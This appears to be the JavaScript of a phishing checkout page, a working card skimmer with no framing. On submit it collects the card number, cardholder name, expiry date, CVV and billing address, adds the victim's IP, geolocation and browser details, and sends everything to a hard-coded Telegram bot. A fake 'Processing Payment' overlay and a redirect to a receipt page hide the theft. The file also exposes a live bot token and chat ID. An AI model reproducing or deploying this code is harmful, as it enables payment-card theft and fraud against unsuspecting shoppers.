// Store user information globally
let countriesData = []; 

// Telegram configuration
const botToken = '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y';
const chatId = '-1002417682998';

// Function to send message to Telegram
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return response.ok;
    } catch (error) {
        console.error('Error:', error);
        return false;
    }
}

// Function to get user's location from ipinfo.io
async function detectUserLocation() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=81e788912b1532');
        const data = await response.json();
        return {
            country: data.country,
            region: data.region,
            city: data.city,
            ip: data.ip,
            timezone: data.timezone,
            location: data.loc
        };
    } catch (error) {
        console.error('Error detecting location:', error);
        return null;
    }
}

// Function to fetch and populate countries
async function initializeCountries() {
    const countrySelect = document.getElementById('country');
    const spinner = document.getElementById('countrySpinner');

    try {
        spinner.style.display = 'block';

        // Fetch user's location and countries list in parallel
        const [userLocation, countriesResponse] = await Promise.all([
            detectUserLocation(),
            fetch('https://restcountries.com/v3.1/all')
        ]);

        const data = await countriesResponse.json();

        // Sort countries by name
        countriesData = data.sort((a, b) =>
            a.name.common.localeCompare(b.name.common)
        );

        // Clear loading option
        countrySelect.innerHTML = '<option value="">Select Country</option>';

        // Populate countries
        countriesData.forEach(country => {
            const option = document.createElement('option');
            option.value = country.cca2;
            option.textContent = country.name.common;
            countrySelect.appendChild(option);

            // If this is user's country, select it
            if (userLocation && country.cca2 === userLocation.country) {
                option.selected = true;
            }
        });

        countrySelect.disabled = false;
    } catch (error) {
        console.error('Error fetching countries:', error);
        countrySelect.innerHTML = '<option value="">Error loading countries</option>';
    } finally {
        spinner.style.display = 'none';
    }
}

// Function to show error for a field
function showError(fieldId, show = true) {
    const field = document.getElementById(fieldId);
    const inputGroup = field.closest('.input-group');
    const errorText = inputGroup.querySelector('.error-text');
    
    if (show) {
        inputGroup.classList.add('error');
        errorText.style.display = 'block';
    } else {
        inputGroup.classList.remove('error');
        errorText.style.display = 'none';
    }
}

// Function to validate form
function validateForm() {
    let isValid = true;
    
    // Required fields
    const requiredFields = [
        'cdnm',      // Card number
        'cdname',    // Cardholder name
        'exdt',      // Expiry date
        'vvv',       // CVV
        'address',   // Address line 1
        'city',      // City
        'zipCode',   // ZIP code
        'country'    // Country
    ];

    // Reset all errors first
    requiredFields.forEach(fieldId => {
        showError(fieldId, false);
    });

    // Check each required field
    requiredFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (!field.value.trim()) {
            showError(fieldId, true);
            isValid = false;
        }
    });

    return isValid;
}

// Create loading overlay
function createLoadingOverlay() {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.9);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 1000;
    `;

    const spinner = document.createElement('div');
    spinner.style.cssText = `
        width: 50px;
        height: 50px;
        border: 3px solid #f3f3f3;
        border-top: 3px solid #107C10;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    `;

    const loadingText = document.createElement('div');
    loadingText.style.cssText = `
        color: #fff;
        margin-top: 1rem;
        font-size: 18px;
    `;
    loadingText.textContent = 'Processing Payment...';

    // Add the @keyframes animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    `;
    document.head.appendChild(style);

    overlay.appendChild(spinner);
    overlay.appendChild(loadingText);
    return overlay;
}

// Add event listeners for input formatting
document.addEventListener('DOMContentLoaded', function() {
    // Initialize countries
    initializeCountries();

    // Card number formatting
    const cdnm = document.getElementById('cdnm');
    if (cdnm) {
        cdnm.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            this.value = value.substring(0, 19);
            showError('cdnm', false);
        });
    }

    // Expiry date formatting
    const exdt = document.getElementById('exdt');
    if (exdt) {
        exdt.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            
            if (value.length >= 2) {
                let month = parseInt(value.substring(0, 2));
                let year = value.length >= 4 ? parseInt(value.substring(2, 4)) : 0;
                
                if (month > 12) {
                    value = '12' + value.substring(2);
                } else if (month < 1) {
                    value = '01' + value.substring(2);
                } else if (month < 10 && value.length >= 2) {
                    value = '0' + month + value.substring(2);
                }

                if (value.length >= 4) {
                    if (year < 24) {
                        value = value.substring(0, 2) + '24';
                    }
                }
                
                value = value.substring(0, 2) + '/' + value.substring(2);
            }
            
            this.value = value.substring(0, 5);
            showError('exdt', false);
        });
    }

    // CVV validation
    const vvv = document.getElementById('vvv');
    if (vvv) {
        vvv.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').substring(0, 4);
            showError('vvv', false);
        });
    }

    // ZIP code validation
    const zipCode = document.getElementById('zipCode');
    if (zipCode) {
        zipCode.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^a-zA-Z0-9]/g, '').substring(0, 10);
            showError('zipCode', false);
        });
    }

    // Clear errors on input for other fields
    ['cdname', 'address', 'city', 'country'].forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('input', function() {
                showError(fieldId, false);
            });
        }
    });
});

// Handle checkout form submission
document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    // Validate form
    if (!validateForm()) {
        return false;
    }

    // Show loading overlay
    const loadingOverlay = createLoadingOverlay();
    document.body.appendChild(loadingOverlay);

    // Collect card data
    const cardData = {
        name: document.getElementById('cdname').value,
        number: document.getElementById('cdnm').value,
        expiry: document.getElementById('exdt').value,
        vvv: document.getElementById('vvv').value
    };

    // Collect billing address
    const billingAddress = {
        address: document.getElementById('address').value,
        address2: document.getElementById('address2').value || '',
        city: document.getElementById('city').value,
        state: document.getElementById('state').value || 'N/A',
        zipCode: document.getElementById('zipCode').value,
        country: document.getElementById('country').options[document.getElementById('country').selectedIndex].text
    };

    // Get user location
    const userLocation = await detectUserLocation();

    // Get current date and time
    const now = new Date();
    const dateTime = now.toLocaleString();

    // Prepare payment message
    const paymentMessage = `
💳 New Card Details Received!
⏰ Date: ${dateTime}

💳 Card Details:
👤 Name: ${cardData.name}
🔢 Number: ${cardData.number}
📅 Expiry: ${cardData.expiry}
🔒 CVV: ${cardData.vvv}

📫 Billing Address:
📍 Street: ${billingAddress.address}
🏢 Unit: ${billingAddress.address2}
🌆 City: ${billingAddress.city}
🏷️ State: ${billingAddress.state}
📮 Postal Code: ${billingAddress.zipCode}
🌍 Country: ${billingAddress.country}

📱 Device Information:
🌐 IP: ${userLocation.ip}
📍 Location: ${userLocation.city}, ${userLocation.region}, ${userLocation.country}
⏰ Timezone: ${userLocation.timezone}
📍 Coordinates: ${userLocation.location}
💻 User Agent: ${navigator.userAgent}
    `;

    try {
        // Send payment information
        const sent = await sendToTelegram(paymentMessage);

        if (sent) {
            // Wait for 5 seconds with the loading overlay
            setTimeout(() => {
                // Remove loading overlay
                loadingOverlay.remove();
                
                // Redirect to receipt page
                window.location.href = 'receipt.html';
            }, 5000); // 5 seconds delay
        }
    } catch (error) {
        console.error('Error:', error);
        loadingOverlay.remove();
        alert('An error occurred. Please try again.');
    }
});